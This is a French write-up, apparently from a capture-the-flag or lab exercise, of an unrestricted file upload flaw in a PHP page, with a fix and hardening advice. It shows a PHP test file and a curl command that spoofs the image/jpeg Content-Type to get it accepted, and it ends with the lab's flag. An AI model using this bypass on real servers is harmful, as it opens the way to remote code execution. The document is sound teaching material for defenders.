Faille d'Upload de Fichier Non Restreint

## 1. Description de la Faille
Cette vulnérabilité permet l'upload de fichiers malveillants sur le serveur en contournant les vérifications de type de fichier.

## 2. Localisation
- Page vulnérable : `http://{IP_ADDRESS}/index.php?page=upload`
- Type de vulnérabilité : Upload de fichier non restreint

## 3. Exploitation

### Étape 1 : Création du fichier test
```php
<?php
// script.php
phpinfo();
?>
```

### Étape 2 : Exploitation via cURL
```bash
curl -F "Upload=send" -F "uploaded=@script.php;type=image/jpeg" http://{IP_ADDRESS}/index.php\?page=upload
```

### Explication technique
- Le serveur ne vérifie que le Content-Type dans la requête
- Il ne vérifie pas le contenu réel du fichier
- En spécifiant `type=image/jpeg`, on trompe le serveur sur le type réel du fichier

## 4. Impact de la Faille
1. Attaques côté serveur :
   - Exécution de code arbitraire
   - Accès aux fichiers système
   - Compromission du serveur
   
2. Attaques côté client :
   - Cross-Site Scripting (XSS)
   - Détournement de contenu
   - Manipulation du DOM

## 5. Comment Corriger
```php
function securiserUpload($fichier) {
    // 1. Vérifier le vrai type MIME
    $type = mime_content_type($fichier['tmp_name']);
    $typesAutorises = ['image/jpeg', 'image/png', 'image/gif'];
    
    if (!in_array($type, $typesAutorises)) {
        return false;
    }
    
    // 2. Générer un nom de fichier sécurisé
    $extension = pathinfo($fichier['name'], PATHINFO_EXTENSION);
    $nomSecurise = bin2hex(random_bytes(16)) . '.' . $extension;
    
    // 3. Définir un chemin sécurisé
    $cheminUpload = '/chemin/securise/' . $nomSecurise;
    
    // 4. Déplacer le fichier
    return move_uploaded_file($fichier['tmp_name'], $cheminUpload);
}
```

## 6. Bonnes Pratiques
1. Validation côté serveur :
   - Vérifier le type MIME réel
   - Valider l'extension
   - Scanner le contenu du fichier

2. Stockage sécurisé :
   - Stocker hors de la racine web
   - Utiliser des permissions restrictives
   - Renommer les fichiers de façon aléatoire

3. Configuration serveur :
   - Désactiver l'exécution dans les dossiers d'upload
   - Limiter la taille des fichiers
   - Implémenter des quotas

## 7. Flag
```
b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f
```

## 8. Ressources
- [OWASP File Upload Cheat Sheet](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [MIME Type List](https://developer.mozilla.org/fr/docs/Web/HTTP/Basics_of_HTTP/MIME_types)